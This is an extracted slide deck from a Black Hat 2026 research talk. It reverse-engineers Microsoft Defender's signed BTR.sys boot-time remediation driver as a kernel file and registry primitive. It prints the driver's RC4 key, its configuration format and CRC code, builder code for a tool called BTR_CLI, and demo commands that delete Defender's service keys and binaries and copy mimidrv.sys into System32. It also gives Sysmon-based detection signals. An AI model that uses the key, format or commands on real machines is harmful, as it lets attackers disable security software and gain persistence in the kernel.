---
title: "BTR Reforged Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive"
speakers: ["Jiří Vinopal"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Jiří Vinopal_BTR Reforged Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive .pdf"
pages: 49
sha256: "934c667a535231fbae6c44fabe8083aec970d56d8dbb8eeea20b38492e4f878a"
text_chars: 22246
ocr_pages: 6
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T23:10:59Z"
---
# BTR Reforged Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive

**Speakers:** Jiří Vinopal  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Jiří Vinopal_BTR Reforged Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive .pdf` (49 pages)

## Slide 1

## Slide 2

###### BTR REFORGED: WEAPONIZING DEFENDER'S REMEDIATION DRIVER AS A KERNEL OPERATION PRIMITIVE

**Jiří Vinopal |** @vinopaljiri **| Check Point Research  |** @_CPResearch_

## Slide 3

###### > > WHOAMI > _

###### **Jiří Vinopal**

• Security Researcher • Malware Researcher • Reverse Engineer **@vinopaljiri - @Dump GUY @DuMpGuYTrIcKsTeR**

**Check Point Research @_CPResearch_ research.checkpoint.com**

## Slide 4

###### FALSE POSITIVE THAT WASN'T

**Value Name Type Data Type** REG_DWORD **1 (Kernel Driver) Start** REG_DWORD **1 (System Start) ErrorControl** REG_DWORD **0 (Ignore) ImagePath** REG_EXPAND_SZ **\??\C:\Windows\system32\drivers\mzqnjtaq.sys Group** REG_SZ **Boot Bus Extender Args** REG_SZ **C:\Windows\system32\drivers\mzqnjtaq.sys:changelist**

BTR REFORGED | JIŘÍ VINOPAL | CHECK POINT RESEARCH

## Slide 5

# IT'S NOT MALWARE. IT'S DEFENDER.

- Boot Time Removal Tool

- **-**

- **Microsoft signed** kernel-mode **driver**

- Reads **encrypted instructions** from an **ADS**

- Executes **Ring 0 file + registry** ops

**What if an attacker learned its language?**

## Slide 6

###### BTR.SYS BOOT TIME REMOVAL TOOL • **Filename: BTR.sys** ( **Microsoft-signed** )

- **Embedded** in **MpEngine.dll** as PE resource

- **Dropped only** when remediation needs a reboot

- **Filename randomized [a-z]{8}.sys** at drop time

## Slide 7

###### STAGED FROM MPENGINE.DLL

###### **Resource Hacker: BOOTTIMETOOL / PACKEDBINARY**

**IDA Pseudocode: MpEngine.dll drops BTR.sys to disk**

## Slide 8

CONFIG VIA :CHANGELIST ADS **IDA Pseudocode: DriverEntry reads Args from service key**

**IDA Pseudocode: MpEngine.dll appends ":changelist" to make the ADS path**

## Slide 9

ONE-SHOT EXECUTION MODEL

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ONE-SHOT EXECUTION MODEL
—/
EXECUTE
LOAD TRANSACTIONS SELF-UNLOAD CONFIGURATION
SERVICE_SYSTEM_START (CONFIGURATION) STATUS_DELETE_PENDING The Entire Attack Surface
During Reboot No IOCTL Interface, No Returns (0xC0000056)
PDB, No Public Docs |
black hat
2026
```

## Slide 10

## REVERSING THE UNDOCUMENTED PROTOCOL

- **Cryptography 101**

- **Integrity**

- **Transaction Structure Format**

- **-**

- **Kernel Primitives Action Menu**

BTR REFORGED | JIŘÍ VINOPAL | CHECK POINT RESEARCH

## Slide 11

###### RC4 - STREAM CIPHER

- **Standard RC4 KSA + PRGA**

- **256-byte** hard-coded key in **.rdata**

- **Same key** in every analyzed build

- **Stable** across 15+ years

- **Used to Encrypt / Decrypt** the **Configuration Blob**

## Slide 12

###### MODIFIED CRC-32  ~CRC32

- **Standard** polynomial **0xEDB88320**

- **CRC register reset** per structure (init **0xFFFFFFFF** )  chain-resistant

- **Final** XOR omitted **= ~CRC32**

- **One subtle deviation: no final XOR**  can **hit hard even a seasoned reverser…**

## Slide 13

###### 18 BTR.SYS BUILDS. ONE RC4 KEY.

###### **Winbindex:**

- 12 **64-bit** MpEngine.dll versions (Win 10/11)

- 5 **unique** BTR.sys builds extracted (post-dedup)

**VirusTotal + Winbindex:**

- VT **Query:** signature:"Boot Time Removal Tool" tag:signed tag:64bits

- **De-duplication** against the Winbindex

**18** unique **64-bit Microsoft-signed BTR.sys** versions **15+** years of **unchanged** crypto **: Win 7** Build 7601  **Win 11 25H2+** ( **July 2026** )

**All versions**  the same hard-coded **RC4 key** , consistent **transaction** format ( **configuration** ), **all** identified **Action IDs supported!**

## Slide 14

###### THE ONE & ONLY 256-BYTE RC4 KEY

|**1E**|**87**|**78**|**1B**|**8D**|**BB**|**A8**|**44**|**CE**|**69**|**70**|**2C**|**0C**|**78**|**B7**|**86**|
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
|A3|F6|23|B7|38|F4|ED|F9|AF|83|53|0F|B3|FC|54|FA|
|A2|1E|B9|CF|13|32|FD|0F|0D|A9|54|F6|87|CB|9E|18|
|27|96|97|90|0E|54|FB|31|7C|9C|BC|E4|8E|23|D0|53|
|71|EC|C1|59|51|B7|F3|64|9D|7C|A3|3E|D6|8D|C9|04|
|7E|82|C9|BA|AD|96|99|D0|D4|58|CB|84|7C|A9|FF|BE|
|3C|8A|77|52|33|55|7D|DE|13|A8|B1|40|87|CC|1B|C8|
|F1|0F|6E|CD|D0|83|A9|59|CF|F8|4A|9D|1D|50|75|5E|
|3E|19|18|18|AF|23|E2|29|35|58|76|6D|2C|07|E2|57|
|12|B2|CA|0B|53|5E|D8|F6|C5|6C|E7|3D|24|BD|D0|29|
|17|71|86|1A|54|B4|C2|85|A9|A3|DB|7A|CA|6D|22|4A|
|EA|CD|62|1D|B9|FB|A2|2E|D1|E9|E1|1D|75|BE|D7|DC|
|0E|CB|0A|8E|68|C2|FF|12|63|40|8D|C8|08|DF|FD|16|
|4B|11|67|74|CD|6B|9B|8D|05|41|1E|D6|26|2E|42|9B|
|A4|95|67|6B|83|98|DB|2F|35|D3|C1|B9|CE|D5|26|36|
|**F2**|**76**|**5E**|**1A**|**95**|**CB**|**7C**|**A4**|**C3**|**DD**|**AB**|**DD**|**BF**|**F3**|**82**|**53**|

## Slide 15

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Transaction Structure Format
(The Configuration)
Global Header (24 Bytes)
_ Offset | Size Field Description
+ 0x00 4 Magic OxFEE1DEAD - ages
t 0x04 4 Version 0x00000002
ee | 0x08 4 PayloadOffset 0x00000010 (Relative offset to Global Payload)
0x0C 4 GlobalCRC ~CRC32 of Header -
7 | (0x0 8 TransID (~CRC32(Payload), Size(Payload)).
Global Payload (Variable)
Feedback File Path: \??\C:\ProgramData\..\mzqnjtaq.dat
——
Operation Item(s)
Item Header (16 Bytes) ————— — - Item Data (Variable)
0x00 4 F DataSize is
0x04 ActionID |
| [Flags] '[String 1] | [String 2] | [ee] ' [Padding] |
4
0x08 4 _HeaderCRC
4 ~CRC32 of Data
Delete File Delete Directory Move / Quarantine Registry Operations black hat
USA
2026
```

## Slide 16

###### GLOBAL HEADER - 24 BYTES

|**Offset**|**Size**
**Field**|**Description**|
|---|---|---|
|**0x00**|4
**Magic**|**0xFEE1DEAD (Little Endian)**|
|**0x04**|4
**Version**|**0x00000002**|
|**0x08**|4
**PayloadOffset**|**0x10 (relative offset to Global Payload; constant)**|
|**0x0C**|4
**GlobalCRC**|**~CRC32of header (with this field zeroed)**|
|**0x10**|8
**TransID**|**Low 4B =~CRC32(Payload); High 4B =Size(Payload)**|
||`struct GLOBAL_HEADER {`||
||`uint32_t Magic;`|`// 0xFEE1DEAD`|
||`uint32_t Version;`
`uint32_t PayloadOffset`|`// 2`
`; // 0x10 (relative offset to Global Payload)`|
||`uint32_t GlobalCRC;`|`// ~CRC32(Header)`|
||`uint32_t TransID_Low;`|`// ~CRC32(Payload)`|
||`uint32_t TransID_High;`|`// Size(Payload)`|

```
};
```

## Slide 17

GLOBAL PAYLOAD (VARIABLE) THE FEEDBACK FILE

- **A null-terminated Unicode string**  immediately follows the **Global Header**

- **Global Payload = Feedback File Path**  **e.g., \??\C:\ProgramData\...\mzqnjtaq.dat** The **path** is configurable (variable)

- The **BTR.sys** driver creates this file and writes a **Transaction Execution Report**

- The **report mirrors** the **Transaction Structure** (input Configuration) **+** updates the first 4 bytes of each **Item's Data** payload ( **[Flags]** ) with the **NTSTATUS** code result of the specific operation ( **Action ID** )

## Slide 18

###### ITEM HEADER - 16 BYTES THE OPERATION ITEM = ACTION

**Offset Size Field Description 0x00** 4 **DataSize Size of Item Data (including padding) 0x04** 4 **ActionID Operation to perform (1-6) 0x08** 4 **HeaderCRC ~CRC32 of header (with this field zeroed) 0x0C** 4 **DataCRC ~CRC32 of Item Data Transaction Structure** ( **configuration** ) can contain multiple **ITEMs** (chaining `struct ITEM_HEADER { uint32_t DataSize; // Size of Item Data uint32_t Action; // Action ID uint32_t HeaderCRC; // ~CRC32(Header) uint32_t DataCRC; // ~CRC32(Data) };`

- **Transaction Structure** ( **configuration** ) can contain multiple **ITEMs** (chaining **Action IDs** ) `struct ITEM_HEADER {`

## Slide 19

###### ITEM DATA (VARIABLE) PER-ACTION SPECIFIC INFO

For **each specific Item Header - Item Data** must exist

- **Item Header**  **per-action contract** ; **Item Data**  per-action specific information **structure**

The **structure** of the data depends on the **Action ID:**

- **Action IDs** ( **3-6** ) start with **[Flags]** ; simple **actions** ( **1-2** , e.g., **File Deletion** ) immediately with path **[String 1]** **`[Flags (Optional 4 bytes)] [String 1] [String 2] ... [Padding]`**

- The **4-Byte padding** trick **:**

- **Required trailing 4 bytes -** not for alignment **!**

- The **driver shifts string data** into the **padding** so it can prepend an **NTSTATUS code** into the original buffer  **feedback** report without reallocation **!**

## Slide 20

###### THE ENTIRE MENU: 6 ACTION IDS  6 KERNEL PRIMITIVES

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
THE ENTIRE MENU:
S ACTION IDS > 6G KERNEL PRIMITIVES
Jip
Action 2: Delete Directory Action 3: Move / Quarantine File
e.
fag
Action 4: Delete Registry Key Action 5: Delete Registry Value Action 6: = Registry Value
```

## Slide 21

###### ACTION 3: DELETE OR ARBITRARY WRITE

- **Empty destination** path  **Delete** File

- **Valid destination** path  **Move / Quarantine / Write** File

- **Move target** unconstrained  ***\System32\*** included

**Ring 0 Write** , **locked-file safe!**

## Slide 22

###### ACTION 6: REGISTRY WRITE + KEY CREATE

- Set **any value** , any type, any data  Creates the **key path if missing!**

- **Persistence primitive from Ring 0**  **Run keys** , **services… No user-mode** hook touching

**Security-control disarm**  **Tamper Protection** , **EDR** config **!**

## Slide 23

###### THE DOUBLE-BACKSLASH PARSER

- **Parsing detail determines** whether your payload **runs!**

- **Action IDs 5/6** split **Key** & **Value name** by **"\\"**

   - **`[Key\Path] + "\\" + [ValueName]`**

- **Found** by **failed** attempts **: BACK-to-IDA** reverse  the driver **returns errors** with **"\"** paths **!**

## Slide 24

##### BTR_CLI: 6-STAGE PIPELINE

**We have the protocol… Now we build a tool that speaks it! Mimics** + **Extends** the **native behavior** of **MpEngine.dll**

**Fallback:** if **MpEngine.dll** patched  ( **RC4** key **changed** )  use an embedded driver ( **BYOVD-like** scenario)

BTR REFORGED | JIŘÍ VINOPAL | CHECK POINT RESEARCH

## Slide 25

BTR_CLI HELP SCREEN

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
BTR_CLI HELP SCREEN
BTR_CLI.exe — help
PS C:\> .\BTR_CLI.exe -h
BTR.sys Exploitation Tool (CLI)
Usage (Single-Mode): BTR_CLI.exe -a <action_id> -s <source> [options]
Usage (Chain-Mode): BTR_CLI.exe -chain -item "<action_id>|<source>" [options]
Core Options:
-trigger <now|boot>
now: Execute immediately (default).
boot: Stage for next reboot (prompts to reboot).
Ex: -a 1 -s "C:\example.txt" -trigger boot
-cleanup <service_name>
Clean up artifacts using service name (e.g. after reboot).
Ex: -cleanup mzqnjtaq
-chain -item "<action_id>|<source>" [options]
Chaining multiple action items into single execution.
Ex: -chain -item "1|]C:\example.txt"
-item "6|HKLM\SYSTEM\...\Example|ValName|Value|1" -trigger boot
Actions:
1: Delete File
-s <file_path>
Ex: -a 1 -s "C:\Windows\Temp\example.txt"
2 : Delete Directory
-s <dir_path>
Note: Directory must be empty.
Ex: -a 2 -s "C:\Windows\Temp\EmptyDir\"
: Move/Quarantine File
-s <file_path> -d <dest_path>
Note: If -d is empty ("") or not specified, file is DELETED.
Ex (Move): -a 3 -s "C:\example.txt" -d "C:\example_moved.txt"
Ex (Delete): -a 3 -s "C:\example.txt" -d ""
: Delete Registry Key
-s <key_path>
Ex: -a 4 -s "HKLM\SOFTWARE\Example"
Ex: -a 4 -s "\Registry\Machine\SOFTWARE\Example"
: Delete Registry Value
-s <key_path> -d <value_name>
Ex: -a 5 -s "HKLM\SOFTWARE\Example" -d "VaLName"
: Set Registry Value
-s <kKey_path> -d <value_name> -v <data> -t <type>
-t types: 1=SZ (default), 2=EXPAND_SZ, 3=BINARY, 4=DWORD,
5=DWORD_BIG_ENDIAN, 7=MULTI_SZ, 11=QWORD
Ex: -a 6 -s "HKLM\SOFTWARE\Example" -d "ValName" -v "Value"
Ex: -a 6 -s "HKLM\SOFTWARE\Example" -d "BinVal" -v "DEADBEEF" -t 3
Ex: -a 6 -s "HKLM\SOFTWARE\Example" -d "DwordVal" -v "Qx123456" -t 4
Ex: -a 6 -s "HKLM\SOFTWARE\Example" -d "MultiVal" -v "Line1\OLine2" -t 7
```

## Slide 26

###### STEALTH ADS STAGING

• **Mimics MpEngine.dll: Driver file: <random8>.sys Config blob: <random8>.sys:changelist Feedback**  let's **stage it** into **ADS** too **: <random8>.sys:<random8>.dat**

```
// Generate random names FIRST (mimics MpEngine.dll behavior)
std::wstring randomBase =GenerateMangledName();
std::wstring serviceName =randomBase;
```

```
// Driver name is now randomized (e.g., mzqnjtaq.sys)
g_DriverPath =g_BaseDir +randomBase +L".sys";
```

```
// Config file is now ADS (e.g., mzqnjtaq.sys:changelist)
g_ConfigFile =g_DriverPath +L":changelist";
```

```
// Feedback file is now ADS (e.g., mzqnjtaq.sys:mzqnjtaq.dat)
```

```
std::wstring feedbackFileDos =g_DriverPath +L":"+randomBase +L".dat";
std::wstring feedbackFileNT =ToNtPath(feedbackFileDos);
```

• **Stealth Configuration** ( **ADS** ) **: No visible** configuration files **… BTR_CLI** utilizes **MpEngine-style** Alternate Data Streams ( **ADS** ) **!**

```
// Prepare Driver (writes random.sys)
```

```
if(!PrepareDriver()) return1;
```

```
// Create Config (writes random.sys:changelist)
```

```
if(CreateConfigurationFile(feedbackFileNT) &&SetupRegistry(serviceName))
```

## Slide 27

###### BTRCRC32: INTEGRITY ROUTINE

**The One to Rule Them All!**

The **more** the **better** ( **used** in **4 places** in the **Transaction** structure  **Configuration** ) **:**

- **`GLOBAL_HEADER::GlobalCRC`** `uint32_t BtrCrc32(const void* data, size_t size, uint32_t initial = 0xFFFFFFFF) {`

• **`GLOBAL_HEADER::TransID_Low`**

- **`ITEM_HEADER::HeaderCRC`**

```
uint32_tcrc =initial;
```

```
constunsignedchar*p =(constunsignedchar*)data;
for(size_ti =0; i <size; i++) {
```

```
crc ^=p[i];
```

- **`ITEM_HEADER::DataCRC`**

- **Standard 0xEDB88320** polynomial

 **Init 0xFFFFFFFF**

- No **final XOR /** No **bitwise inversion!**

```
for(intj =0; j <8; j++) {
if(crc &1) crc =(crc >>1) ^0xEDB88320;
elsecrc >>=1;
```

```
}
```

```
}
returncrc;
}
```

**Anyone in the room can reproduce this from memory…**

## Slide 28

###### CONSTRUCT ITEM EXAMPLE: ACTION 6 BUILDER

```
std::vector<uint8_t> ConstructItem(uint32_taction, conststd::wstring&source, conststd::wstring&dest, conststd::wstring&
data, uint32_ttype) {
```

```
std::vector<uint8_t>itemData;
std::wstring srcNt =ToNtPath(source);
std::wstring destNt =ToNtPath(dest);
std::wstring fullRegPath;
```

```
switch(action) {
// ... case 1-5 handling
case6:// Set Reg Value
fullRegPath =srcNt +L"\\\\"+dest;// For Reg Values: dest == ValueName (double-backslash quirk)
AppendDWORD(itemData, 0);// Flags
AppendDWORD(itemData, type);// REG_DWORD / SZ / ...
std::vector<uint8_t>finalData;// finalData == Item Data
// ... encode finalData by type (DWORD / QWORD / BINARY / MULTI_SZ / SZ)
AppendDWORD(itemData, (uint32_t)finalData.size());// Size of Item Data
AppendWString(itemData, fullRegPath);// Item Data
itemData.insert(itemData.end(), finalData.begin(), finalData.end());
break;
}
for(inti =0; i <4; i++) itemData.push_back(0);// 4-byte Padding
```

```
uint32_titemDataCrc =BtrCrc32(itemData.data(), itemData.size());// BtrCrc32(Item Data)
BTR_ITEM_HEADER itemHeader ={ (uint32_t)itemData.size(), action, 0, itemDataCrc };// ITEM_HEADER
itemHeader.HeaderCRC=BtrCrc32(&itemHeader, sizeof(BTR_ITEM_HEADER));// BtrCrc32(ITEM_HEADER)
// ... put itemBlob together –finalize ITEM_HEADER + Item Data
returnitemBlob;}
```

## Slide 29

###### ANTI-FORENSICS BY DESIGN

**Two cleanup** mechanisms working **together! Combined: Minimal forensic** trace **! BTR.sys**  **STATUS_DELETE_PENDING** on **SUCCESS Automatic 0xC0000056**  **Driver** unload + delete-pending

**BTR_CLI** & **BTR.sys**  **Log Creation** & **Deletion: BTR.sys always** creates the **BootClean.log** in **DriverEntry** ( **Log Artifact** ) **BTR_CLI forces** the **self-deletion** via a prepended **Action 1** ( **Delete File** ) targeting that **Log Path**

## Slide 30

### THE GOLDEN WINDOW

FILESYSTEM READY. SECURITY STACK DORMANT.

## Slide 31

###### BTR.SYS NEEDS A LIVE FILESYSTEM

###### **The naive plan would be Start=0**  **boot start: load as early as possible!**

- **DriverEntry performs file I/O directly…**

- **Requires initialized Object Manager!**

- **Requires storage stack - SystemRoot symlink!**

**Phase 0 has neither yet…**

## Slide 32

START=0 IS IMPOSSIBLE AND THAT'S THE OPPORTUNITY If **Start=0** worked, **Microsoft** would have noticed  **BTR.sys** code implementation would be different **…**

**Architectural** constraint that **blocks** early loading also tells us when to load **…** It pushes us into **Phase 1** ( **SERVICE_SYSTEM_START** )  **Filesystem** is **ready!**

**The question: how early in Phase 1 can we land?**

 **Specifically:** before **WdFilter's** user-mode brain ( **MsMpEng.exe** , etc.) comes online **…**

**Answer: the Boot Bus Extender group!**

## Slide 33

###### SERVICEGROUPORDER: TWO-PASS BOOT

**Two-pass driver** loader **:**

**1. OS Loader**  **Phase 0**  **enumerates** & **loads Start=0** ( **Boot** drivers)

**2. Kernel I/O Manager**  **Phase 1**  **enumerates** & **loads Start=1** ( **System** drivers)

Both passes walk **ServiceGroupOrder** ( **WIN Registry** ) to decide the within-phase order **!**

**Boot Bus Extender** group **(BTR.sys** )  position 4 in typical layout  earliest practical execution slot in **Phase 1**  following initialization of **filesystem** ( **Ntfs.sys** ) **+** transition **OS Loader**  **Kernel I/O Manager!**

**WdFilter.sys** is technically loaded, but it's **blind** without its **user-mode** brain **!**

**Writable filesystem** , **dormant security suite: The Golden Window**

## Slide 34

###### BOOT BUS EXTENDER: POSITION 4

**System Reserved EMS WdfLoadGroup Boot Bus Extender**  **BTR.sys executes here (Start=1) ...   23 groups   ... FSFilter Replication FSFilter Anti-Virus**  **WdFilter.sys (lower, but Start=0) FSFilter Undelete FSFilter Activity Monitor**  **UCPD.sys (Start=1) ...   24 groups   ... NDIS**  **Network drivers ...   14 groups   ...**

## Slide 35

PROCMON BOOT TIMELINE Live boot capture on **Win 11 25H2**  every step **proven empirically! 1. Phase 0: WdBoot.sys** , **WdFilter.sys** , **Ntfs.sys load** ( **ELAM** evaluates **Phase 0**  irrelevant for **Phase 1** )

2. Start of **Phase 1: BTR.sys executes** its **payload!**

**3. UCPD.sys loads** milliseconds later  already too **late…**

**4. MsMpEng.exe starts** ~34 seconds after **BTR.sys** has finished its **work!**

## Slide 36

###### FILESYSTEM NEUTRALIZATION

**Golden Window** • **BTR.sys removing** the **Defender** binaries ( **WdFilter.sys** & **MsMpEng.exe** ) during the

• **Filesystem** is fully **writable** ; the files are **not yet locked** by **Defender's** processes **…**

• **Executed before user-mode Defender** services have a chance to start  **kernel-mode** deletes **win!**

## Slide 37

###### REGISTRY TAMPER PROTECTION BYPASS

- **Runtime** version of the **bypass**  **'trigger now'** mode **!**

- **Defender** service **registry keys deleted** at **runtime** , e.g., **WdFilter** , **WinDefend** , related **entries…**

• **This** is the **runtime counterpart** to the **boot-time** filesystem **demolition!**

## Slide 38

#### DEMO TIME - BTR_CLI WIN 11 25H2 - KILL CHAIN

BTR REFORGED | JIŘÍ VINOPAL | CHECK POINT RESEARCH

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
a
a arte sae: --* ; ¢ if 7 black hat
BTR REFORGED | JIRI VINOPAL |. CHECK POINT RESEARCH : A ©2846
```

## Slide 39

## Slide 40

THE THREE COMMANDS

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
THE THREE COMMANDS
eee BTR_CLI.exe — demo
Stage 2: trigger now (runtime registry tamper-protection bypass)
BTR_CLI.exe -chain
-item "4]HKLM\SYSTEM\CurrentControlSet\Services\WdFilter"
-item "4]HKLM\SYSTEM\CurrentControlSet\Services\WinDefend"
-trigger now
Stage 3: trigger boot (Golden Window file deletion)
BTR_CLI.exe -chain
-item "1]C:\Windows\System32\drivers\wd\WdFilter.sys"
-item "1]C:\ProgramData\Microsoft\Windows Defender\PLlatform\4.18.26010.5-0\MsMpEng. exe"
-trigger boot
Stage 4: arbitrary write to System32\drivers
BTR_CLI.exe -a 3
-s "C:\Users\admin\Desktop\mimidrv\mimidrv.sys"
-d "C:\Windows\System32\drivers\mimidrv.sys"
```

## Slide 41

SYSTEM PID 4 ATE THE EXAMPLE As in the **Demo** ( **example.txt** here, **WdFilter.sys** & **MsMpEng.exe** in video) **:**

- **Sysmon** event ID **23** logs the **File Deletion**  attributed to **System PID 4** ( **Kernel** ) **…**

- Immediately follows **DriverLoad** event for the **BTR.sys** with **randomized** name **...**

• Pair the **DriverLoad** ID **6** + ID **23** sequence  **execution lineage signal** we can build on **!**

## Slide 42

POST-REBOOT: DEFENDER GONE.

**Fully** updated **Win 11 25H2 + Tamper Protection on**  **every** alert that should have **fired didn't**  the **Defender stack** is **no longer** on **disk!**

**No exploit** . **No CVE** . **No memory corruption… Signed Microsoft** driver, used as **designed** , in a **window Microsoft** created **! If prevention is dead, what's left? Detection.**

## Slide 43

###### WDAC & BLOCKLISTS DON'T APPLY

**BTR.sys** is a **Windows built-in** , **Microsoft-signed** , and functionally **required** driver **…** • **Microsoft Vulnerable Driver Blocklist** (using **WDAC** ) cannot **block** it  It can't list a **required** system component **!**

**Not** a **LOLDriver**  Something **New…**

- **LOLDriver** ecosystem assumes the **bad driver** is third-party **/** outdated **/** vulnerable  **None** of those apply here **!**

**This** establishes a **new threat category:**

**Trusted Remediation Primitives with Undocumented Internals!**

## Slide 44

###### BEHAVIORAL DETECTION SIGNALS

**Signal**

**Sysmon ID Trigger Condition**

**ADS write to ":changelist"**

**15**

**Filename ends in ":changelist"**

**DriverLoad**  **FileDelete Service-key with ":changelist" Args BootClean.log FileCreate + FileDelete Mitigation**

**6 + 23**

**12 / 13**

**11 + 23**

**—**

**DriverLoad (BTR.sys hash) + FileDelete (especially security binaries), PID 4**

**RegistryEvent Group=Boot Bus Extender**

**System PID 4 within seconds**

**Restrict SeLoadDriverPrivilege Behavioral EDR Rules**

BTR REFORGED | JIŘÍ VINOPAL | CHECK POINT RESEARCH

## Slide 45

###### SIGNALS IN PRACTICE

**Sysmon Event ID 15: BTR_CLI writing encrypted config to ":changelist"**

**Sysmon Event ID 11 + 23: Anti-Forensics Telemetry System creating & deleting BootClean.log**

## Slide 46

###### NOT YET IN THE WILD DETECT FIRST

**We have not observed real world abuse of this technique!**

###### THE WINDOW FOR DEFENDERS

**This Defense window closes the moment this talk ends!**

###### THE ONLY DEFENSE MSRC NOT PATCHING

**Deploy the detections before the adopters arrive!**

## Slide 47

15+ YEARS. UNCHANGED. UNBLOCKABLE.

**Reported to MSRC on 2026 02 21: NO immediate servicing**  **NO patch planned!**

**BTR.sys operational across Windows 7 (oldest - tested)**  **Windows 11 25H2 fully updated as of = July 2026 Permanent primitive!**

## Slide 48

# WHAT ELSE ARE YOU TRUSTING BLINDLY?

**Signature based trust is necessary but not sufficient!**

**Behavioral context & execution lineage must complement it! The defensive technology became the offensive capability!**

## Slide 49

#### THANK YOU! Q&A · CONTACT

**Check Point Research** @_CPResearch_ research.checkpoint.com

**Jiří Vinopal** @vinopaljiri - @Dump GUY @DuMpGuYTrIcKsTeR jiriv@checkpoint.com

- **Tool:** github.com/Dump GUY/BTR_CLI - **/ Publication: Paper** research.checkpoint.com (post conference)

BTR REFORGED | JIŘÍ VINOPAL | CHECK POINT RESEARCH
